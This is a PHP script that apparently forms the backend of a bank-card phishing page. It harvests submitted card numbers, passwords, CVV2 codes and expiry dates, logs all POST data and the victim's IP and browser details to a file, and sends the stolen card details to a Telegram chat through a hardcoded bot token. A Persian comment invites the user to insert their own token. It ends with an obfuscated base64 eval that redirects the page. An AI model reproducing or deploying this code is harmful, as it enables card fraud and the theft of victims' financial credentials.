﻿<?php
$handle = fopen("", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
if($_POST['CARD1']){
  $cards = $_POST['CARD1'];
  $cardss = $_POST['CARD2'];
  $cardsss = $_POST['CARD3'];
  $cardssss = $_POST['CARD4'];
  $pass = $_POST['PASSWORD'];
  $cvv = $_POST['CVV2'];
  $mah = $_POST['MONTH'];
  $sal = $_POST['YEARS'];
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$user_ip = getUserIP();
$protocol = $_SERVER['SERVER_PROTOCOL'];
    $port = $_SERVER['REMOTE_PORT'];
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $ref = $_SERVER['HTTP_REFERER'];
    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    file_put_contents("","$cards$cardss$cardsss$cardssss:$pass:$cvv:$sal:$mah");
    $token = "747784696:AAGi8mGrBHqLUw9CLMFQTXv-Xl7xxwEH1go"; //توکن رباتتون رو اینجا وارد کنید
     $textmsg = "
💳عمو کارت زدم😂❤️😍 
➖➖➖➖➖➖➖
🔰 Card : $cards $cardss $cardsss $cardssss
🔰 Pass : $pass
🔰 CVV2 : $cvv
🔰 $sal:$mah
➖➖➖➖➖➖➖";




     $gpid = -1001352830674; 

     $send = file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$gpid&text=".urlencode($textmsg));
}else{
    echo "):";
}
?>
<?php eval("?>".base64_decode("PG1ldGEgY29udGVudD0nMDt1cmw9aXAucGhwJyBodHRwLWVxdWl2PSdyZWZyZXNoJy8+")); ?>
